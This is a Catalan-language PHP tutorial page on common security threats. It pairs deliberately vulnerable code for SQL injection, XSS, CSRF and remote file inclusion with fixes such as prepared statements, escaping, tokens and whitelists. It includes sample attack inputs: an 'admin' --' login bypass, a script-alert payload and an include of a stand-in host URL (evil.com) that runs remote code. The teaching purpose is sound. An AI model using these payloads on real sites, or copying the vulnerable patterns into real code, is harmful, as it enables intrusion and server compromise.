<!DOCTYPE html>
<html lang="ca">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amenaces de Seguretat Comunes</title>

    <link rel="alternate" href="https://campusempresa.com/es/php/common-security-threats" hreflang="es" />
    <link rel="alternate" href="https://campusempresa.com/es/php/common-security-threats" hreflang="x-default" />
	<link rel="alternate" href="https://campusempresa.com/ca/php/common-security-threats" hreflang="ca" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/ca/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Construint la societat d'avui i del demà</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
							<a href="/es/php/common-security-threats" id="lnk_lang_es" data-lang="es" class="px-2">ES</a></b>
				|
				<b id="lit_lang_ca" class="px-2">CA</b>
								</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/ca/objective">El Projecte</a>
				<a href="/ca/about">Sobre nosaltres</a>
				<a href="/ca/contribute">Contribuir</a>
				<a href="/ca/donate">Donacions</a>
				<a href="/ca/licence">Llicència</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Construcció d'un Marc MVC Simple</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Amenaces de Seguretat Comunes</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Sanitització i Validació de Dades &#x25BA;</a>
			</div>
</div>
<div class='content'><p>En aquesta secció, explorarem les amenaces de seguretat comunes que els desenvolupadors de PHP haurien de conèixer. Entendre aquestes amenaces és crucial per escriure aplicacions PHP segures. Cobrirem diversos tipus d'atacs, com funcionen i com mitigar-los.</p>
</div><h1>Injecció SQL</h1>
<div class='content'><p>La injecció SQL és una de les amenaces de seguretat més comunes i perilloses. Es produeix quan un atacant és capaç de manipular una consulta SQL injectant codi SQL maliciós.</p>
</div><h2>Exemple d'Injecció SQL</h2>
<div class='content'><p>Considereu el següent codi PHP que és vulnerable a la injecció SQL:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnJHVzZXJuYW1lJyBBTkQgcGFzc3dvcmQgPSAnJHBhc3N3b3JkJyI7CiRyZXN1bHQgPSBteXNxbGlfcXVlcnkoJGNvbm4sICRxdWVyeSk7Cj8+"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$query = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;
$result = mysqli_query($conn, $query);
?&gt;</pre></div><div class='content'><p>Si un atacant introdueix <code>admin' --</code> com a nom d'usuari i qualsevol cosa com a contrasenya, la consulta es converteix en:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("U0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ICdhZG1pbicgLS0nIEFORCBwYXNzd29yZCA9ICcn"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>SELECT * FROM users WHERE username = 'admin' --' AND password = ''</pre></div><div class='content'><p>Això efectivament comenta la comprovació de la contrasenya, permetent a l'atacant evitar l'autenticació.</p>
</div><h2>Mitigació</h2>
<div class='content'><p>Per prevenir la injecció SQL, sempre utilitzeu sentències preparades i consultes parametritzades:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHN0bXQgPSAkY29ubi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ID8gQU5EIHBhc3N3b3JkID0gPyIpOwokc3RtdC0+YmluZF9wYXJhbSgic3MiLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CiRzdG10LT5leGVjdXRlKCk7CiRyZXN1bHQgPSAkc3RtdC0+Z2V0X3Jlc3VsdCgpOwo/Pg=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
$stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
$stmt-&gt;execute();
$result = $stmt-&gt;get_result();
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Scripting (XSS)</h1>
<div class='content'><p>Els atacs XSS es produeixen quan un atacant injecta scripts maliciosos en contingut que després és renderitzat pel navegador d'un usuari. Això pot conduir a robatori de dades, segrest de sessions i altres activitats malicioses.</p>
</div><h2>Exemple de XSS</h2>
<div class='content'><p>Considereu el següent codi PHP que és vulnerable a XSS:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiAkX0dFVFsnbmFtZSddOwo/Pg=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . $_GET['name'];
?&gt;</pre></div><div class='content'><p>Si un atacant introdueix <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code> com a nom, el script s'executarà en el navegador de l'usuari.</p>
</div><h2>Mitigació</h2>
<div class='content'><p>Per prevenir XSS, sempre sanegeu i escapeu les entrades de l'usuari:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiBodG1sc3BlY2lhbGNoYXJzKCRfR0VUWyduYW1lJ10sIEVOVF9RVU9URVMsICdVVEYtOCcpOwo/Pg=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Request Forgery (CSRF)</h1>
<div class='content'><p>Els atacs CSRF es produeixen quan un atacant enganya un usuari perquè realitzi accions en una aplicació web on està autenticat. Això pot conduir a accions no autoritzades realitzades en nom de l'usuari.</p>
</div><h2>Exemple de CSRF</h2>
<div class='content'><p>Considereu un formulari que permet a un usuari canviar la seva adreça de correu electrònic:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PGZvcm0gYWN0aW9uPSJjaGFuZ2VfZW1haWwucGhwIiBtZXRob2Q9IlBPU1QiPgogICAgPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIEVtYWlsIj4KPC9mb3JtPg=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>Un atacant podria crear un formulari maliciós que enviï una sol·licitud a <code>change_email.php</code> sense el coneixement de l'usuari.</p>
</div><h2>Mitigació</h2>
<div class='content'><p>Per prevenir CSRF, utilitzeu tokens per validar les sol·licituds:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwokdG9rZW4gPSBiaW4yaGV4KHJhbmRvbV9ieXRlcygzMikpOwokX1NFU1NJT05bJ3Rva2VuJ10gPSAkdG9rZW47Cj8+Cgo8Zm9ybSBhY3Rpb249ImNoYW5nZV9lbWFpbC5waHAiIG1ldGhvZD0iUE9TVCI+CiAgICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImVtYWlsIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkdG9rZW47ID8+Ij4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDaGFuZ2UgRW1haWwiPgo8L2Zvcm0+"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
$token = bin2hex(random_bytes(32));
$_SESSION['token'] = $token;
?&gt;

&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $token; ?&gt;&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>En <code>change_email.php</code>, valideu el token:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoJF9QT1NUWyd0b2tlbiddICE9PSAkX1NFU1NJT05bJ3Rva2VuJ10pIHsKICAgIGRpZSgiQ1NSRiB0b2tlbiB2YWxpZGF0aW9uIGZhaWxlZCIpOwp9CgovLyBQcm9jZWVkIHdpdGggZW1haWwgY2hhbmdlCj8+"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
if ($_POST['token'] !== $_SESSION['token']) {
    die(&quot;CSRF token validation failed&quot;);
}

// Proceed with email change
?&gt;</pre></div><div class='content'></div><h1>Execució de Codi Remot (RCE)</h1>
<div class='content'><p>L'RCE es produeix quan un atacant és capaç d'executar codi arbitrari en el servidor. Això pot conduir a la compromissió completa del servidor.</p>
</div><h2>Exemple d'RCE</h2>
<div class='content'><p>Considereu el següent codi PHP que és vulnerable a RCE:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGZpbGVuYW1lID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZW5hbWUpOwo/Pg=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$filename = $_GET['file'];
include($filename);
?&gt;</pre></div><div class='content'><p>Si un atacant introdueix <code>http://evil.com/malicious.php</code> com a fitxer, el codi maliciós s'executarà en el servidor.</p>
</div><h2>Mitigació</h2>
<div class='content'><p>Per prevenir RCE, mai inclogueu fitxers basats en l'entrada de l'usuari. Utilitzeu una llista blanca de fitxers permesos:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGFsbG93ZWRfZmlsZXMgPSBbJ2hvbWUucGhwJywgJ2Fib3V0LnBocCcsICdjb250YWN0LnBocCddOwokZmlsZW5hbWUgPSAkX0dFVFsnZmlsZSddOwoKaWYgKGluX2FycmF5KCRmaWxlbmFtZSwgJGFsbG93ZWRfZmlsZXMpKSB7CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cn0gZWxzZSB7CiAgICBkaWUoIkludmFsaWQgZmlsZSIpOwp9Cj8+"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$allowed_files = ['home.php', 'about.php', 'contact.php'];
$filename = $_GET['file'];

if (in_array($filename, $allowed_files)) {
    include($filename);
} else {
    die(&quot;Invalid file&quot;);
}
?&gt;</pre></div><div class='content'></div><h1>Resum</h1>
<div class='content'><p>Entendre i mitigar les amenaces de seguretat comunes és essencial per als desenvolupadors de PHP. Aquí teniu els punts clau a recordar:</p>
<ul>
<li><strong>Injecció SQL</strong>: Utilitzeu sentències preparades i consultes parametritzades.</li>
<li><strong>XSS</strong>: Sanegeu i escapeu les entrades de l'usuari.</li>
<li><strong>CSRF</strong>: Utilitzeu tokens per validar les sol·licituds.</li>
<li><strong>RCE</strong>: Eviteu incloure fitxers basats en l'entrada de l'usuari; utilitzeu una llista blanca.</li>
</ul>
<p>Seguint aquestes millors pràctiques, podeu reduir significativament el risc de vulnerabilitats de seguretat en les vostres aplicacions PHP.</p>
</div><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Construcció d'un Marc MVC Simple</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Amenaces de Seguretat Comunes</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Sanitització i Validació de Dades &#x25BA;</a>
			</div>
</div>
</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicitat</h1>
			<p>Aquest espai està destinat a publicitat.</p>
			<p>Si vols ser patrocinador, contacta amb nosaltres per incloure enllaços en aquesta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Gràcies per col·laborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Tots els drets reservats</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Entès!</a>
    <a href="/ca/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
